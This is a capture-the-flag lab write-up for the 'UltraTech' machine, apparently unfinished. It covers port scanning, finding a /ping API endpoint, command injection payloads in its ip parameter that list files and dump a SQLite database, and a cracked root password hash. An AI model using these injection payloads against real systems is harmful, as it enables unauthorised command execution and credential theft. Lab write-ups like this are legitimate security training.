# UltraTech 

## Task 1
CTF assignment: <br/>
You have been contracted by UltraTech to pentest their infrastructure. 
It is a grey-box kind of assessment, the only information you have 
is the company's name (UltraTech) and their server's IP address (10.66.154.141).<br/>

Deploye Lab Machine and AttackBox. 


## Task 2: It's enumeration time! 

#### Q: Which software is using the port 8081?
A: Node.js

How I got there: 
```bash
nmap -sC -sV -p- 10.66.154.141

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-27 22:01 UTC
Nmap scan report for ip-10-66-154-141.ec2.internal (10.66.154.141)
Host is up (0.00031s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 79:0d:3a:c2:d2:0c:6f:83:7c:a4:3d:f8:d4:65:b7:e6 (RSA)
|   256 83:9e:91:c9:67:50:1c:f5:63:41:44:8a:23:f1:c9:aa (ECDSA)
|_  256 15:14:e6:15:63:cb:72:dc:13:80:e3:6f:90:3d:73:5f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```

#### Q: Which other non-standard port is used?
A: 31331 

#### Q: Which software using this port?
A: Apache 

#### Q: Which GNU/Linux distribution seems to be used?
A: Ubuntu

#### Q: The software using the port 8081 is a REST api, how many of its routes are used by the web application?
A: a

How I got there: 

Fetched the web app on port 31331:  
```bash
curl -s http://10.66.154.141:31331
```
The HTML source code revealed a JS reference at the bottom of the page to js/app.min.js. Tried removing the ".min" and the un-minified version of the .js script was also available and easer to read. Here I piped the beautified version of app.js into less, so it's easier to page up and down through the code in Terminal:   
```bash
curl -s http://10.66.154.141:31331/js/app.js | less 
#searched for /api/ by typing "api/"+ Enter while .js open in less - found no results 
```
Opened http://10.66.154.141:31331/js/ in Firefox on AttackBox and found 3 .js files: 
```bash
api.js
app.js
app.min.js 
```
Pulled up http://10.66.154.141:31331/js/api.js, which revealed 2 endpoints: 
```javascript
//...
function getAPIURL() {
	return `${window.location.hostname}:8081`
}
//...
function checkAPIStatus() {
	const req = new XMLHttpRequest();
	try {
	    const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
	    req.open('GET', url, true); 
        //...
    }
}            
//..
form.action = http://${getAPIURL()}/auth //
```
<br />

## Task 3: Let the fun begin

#### Q: There is a database lying around, what is its filename?
A: utech.db.sqlite 

Via Firefox url bar, entered the the param to /ping endpoint and got the following response
```bash
http://10.66.150.253:8081/ping?ip=127.0.0.1 

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.050/0.050/0.050/0.000 ms 
```

URL query string can be manually manipulated. Tried appending a pipe character to see if Command Injection works and got the following: 
```bash 
#entered these variations in Firefox browser's url bar: 
http://10.66.150.253:8081/ping?ip=127.0.0.1|`ls`
http://10.66.150.253:8081/ping?ip=127.0.0.1%27\n%27`ls`
http://10.66.150.253:8081/ping?ip=10.66.150.253%27;%27`ls` 

#Firefox browser displayed the name of the .sqlite db: 
ping: utech.db.sqlite: Name or service not known  
```


#### Q: What is the first user's password hash?
A: f357a0c52799563c7c7b76c1e7543a32

```bash 
#tried using Linux cat command to read the contents of the .sqlite file via command injection: 
http://10.66.150.253:8081/ping?ip=10.66.150.253';'`cat%20utech.db.sqlite` 
http://10.66.150.253:8081/ping?ip=10.66.150.253%27;%27`cat%20utech.db.sqlite` 

#Firefox browser displayed the name of the .sqlite db: 
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Name or service not known   
```



#### Q: What is the password associated with this hash?
A: n100906

```bash 
user: root 
hash: f357a0c52799563c7c7b76c1e7543a32 
cracked hash: n100906

```
Ran the above question's result for the first user through CrackStation.com. It turned out to be an MD5 hash: <br />
<img src="images/task3_q_hashpw.png" width="800"><br/>




## Task 3: the root of all evil!  

#### Q: ?
A: 











